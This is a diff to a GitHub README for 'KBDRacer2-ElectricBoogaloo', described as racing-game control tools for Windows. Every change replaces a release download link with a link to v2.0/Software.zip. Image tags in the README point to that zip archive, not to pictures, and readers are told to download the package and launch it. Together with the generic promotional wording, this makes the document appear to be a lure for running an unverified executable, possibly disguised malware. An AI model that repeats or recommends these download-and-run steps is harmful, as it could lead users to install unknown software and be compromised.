@@ -3,7 +3,7 @@
 
 ## Make It Work, not (you,) Stupid. (MIWnyS)
 
-![Racing Car](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v1.0.0/Application.zip)
+![Racing Car](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v2.0/Software.zip)
 
 Welcome to **KBDRacer2-ElectricBoogaloo** GitHub repository! If you are a fan of racing games like **Forza Horizon** or **Forza Motorsport**, this is the place to be. Our project focuses on enhancing your gaming experience by providing tools for better control and performance in racing games on Windows platforms.
 
@@ -22,7 +22,7 @@ Welcome to **KBDRacer2-ElectricBoogaloo** GitHub repository! If you are a fan of
 
 To get started with **KBDRacer2-ElectricBoogaloo**, download the software package from the link below:
 
-[![Download Software](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v1.0.0/Application.zip)](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v2.0/Software.zip)](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the software package and follow the instructions to install and set up the tools for your gaming needs.
 
@@ -38,7 +38,7 @@ Let's hit the virtual tracks together and elevate your gaming experience with **
 
 Keep racing, keep gaming, and most importantly, have fun! 🎮🏆
 
-![Gaming Controller](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v1.0.0/Application.zip)
+![Gaming Controller](https://github.com/samulipepro1/KBDRacer2-ElectricBoogaloo/releases/download/v2.0/Software.zip)
 
 --- 
 
